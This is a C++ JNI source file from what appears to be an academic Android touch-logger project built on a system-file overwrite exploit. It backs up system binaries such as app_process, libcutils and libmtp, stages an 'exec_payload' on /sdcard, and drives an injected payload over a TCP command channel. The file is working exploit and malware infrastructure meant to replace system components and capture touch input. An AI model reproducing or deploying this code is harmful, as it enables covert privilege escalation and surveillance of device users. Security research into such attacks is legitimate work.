#include <jni.h>
#include <string>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <cerrno>
#include <string.h>

#include "dirty/file_utils/file_utils.h"
#include "utils/net_utils.h"

#ifdef __aarch64__
#define APP_PROCESS_PATH "/system/bin/app_process64"
#define LIBCUTILS_PATH "/system/lib64/libcutils.so"
#define LIBMTP_PATH "/system/lib64/libmtp.so"
#else
#define APP_PROCESS_PATH "/system/bin/app_process32"
#define LIBCUTILS_PATH "/system/lib/libcutils.so"
#define LIBMTP_PATH "/system/lib/libmtp.so"
#endif

#define EXEC_PAYLOAD_NAME "exec_payload"
#define APP_PROCESS_FALLBACK_PATH "/system/bin/app_process"
#define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/" EXEC_PAYLOAD_NAME

// TODO: make this depend on build type
#define DEBUG 1

#define ARR_LEN(N) sizeof(N) / sizeof(N[0])

char app_process_backup_path[PATH_MAX];
char exec_payload_path[PATH_MAX];
char payload_path[PATH_MAX];
char app_process_remote_path[PATH_MAX];
char libcutils_backup_path[PATH_MAX];
char libmtp_backup_path[PATH_MAX];
char shared_payload_path[PATH_MAX];

static void initPaths(const char* localPath)
{
  snprintf(app_process_backup_path, PATH_MAX, "%s/%s", localPath, "app_process.bak");
  snprintf(exec_payload_path, PATH_MAX, "%s/%s", localPath, EXEC_PAYLOAD_NAME);
  snprintf(payload_path, PATH_MAX, "%s/%s", localPath, "payload");
  snprintf(libcutils_backup_path, PATH_MAX, "%s/%s", localPath, "libcutils.so.bak");
  snprintf(libmtp_backup_path, PATH_MAX, "%s/%s", localPath, "libmtp.so.bak");
  snprintf(shared_payload_path, PATH_MAX, "%s/%s", localPath, "libshared_payload.so");
}

static bool prepareCommon(const char* localPath)
{
  initPaths(localPath);

  struct stat st;
  if (stat(APP_PROCESS_PATH, &st) == 0)
  {
    snprintf(app_process_remote_path, PATH_MAX, "%s", APP_PROCESS_PATH);
  }
  else
  {
    snprintf(app_process_remote_path, PATH_MAX, "%s", APP_PROCESS_FALLBACK_PATH);
  }

  LOGV("Backup app_process...");

  if (copy_file_with_mode(app_process_remote_path, app_process_backup_path, 0777) == -1)
  {
    LOGV("Failed!");
    return false;
  }

  LOGV("Done!");
  LOGV("Move exec_payload to external memory...");

  if (copy_file(exec_payload_path, EXEC_PAYLOAD_SDCARD_PATH) == -1)
  {
    LOGV("Failed!");
    return false;
  }

  LOGV("Done!");

  return true;
}

static int createTestFile(const char* filename, const char* fileContents)
{
  FILE* file = fopen(filename, "w+");
  if (file == NULL)
  {
    LOGV("Unable to open file \"%s\": %s!", filename, strerror(errno));
    return -1;
  }

  size_t written = fwrite(fileContents, strlen(fileContents), sizeof(char), file);
  if (written != strlen(fileContents))
  {
    LOGV("Unable to write to \"%s\": written %lu instead of %lu bytes: %s!",
         filename, written, strlen(fileContents), strerror(errno));
    fclose(file);
    return -1;
  }

  fclose(file);
  return 0;
}

extern "C"
JNIEXPORT jint JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_initPayloadConnection(JNIEnv* env,
                                                                             jclass type,
                                                                             jint port)
{
  return (jint) init_connection((int) port);
}

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_writeCommandToTcp(JNIEnv* env, jclass type,
                                                                         jint sockFd,
                                                                         jstring command_)
{
  const char* command = env->GetStringUTFChars(command_, 0);
  ssize_t written = write_command((int) sockFd, command);
  env->ReleaseStringUTFChars(command_, command);

  if (written == -1)
  {
    LOGV("Unable to write data to socket %d: %s!", (int) sockFd, strerror(errno));
    return (jboolean) false;
  }

  char* returnValue;
  ssize_t readed = read_command((int) sockFd, &returnValue);

  if (readed == -1)
  {
    LOGV("Unable to read response from TCP socket!");
    return (jboolean) false;
  }

  if (strcmp(returnValue, RESPONSE_OK) == 0)
  {
    return (jboolean) true;
  }
  else if (strcmp(returnValue, RESPONSE_ERROR) == 0)
  {
    LOGV("Got error response!");
    return (jboolean) false;
  }
  else
  {
    LOGV("Unknown response: \"%s\"!", returnValue);
    return (jboolean) false;
  }
}

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_closeTcpSocket(JNIEnv* env, jclass type,
                                                                      jint sockFd)
{
  return (jboolean) (close_connection((int) sockFd) == 0);
}
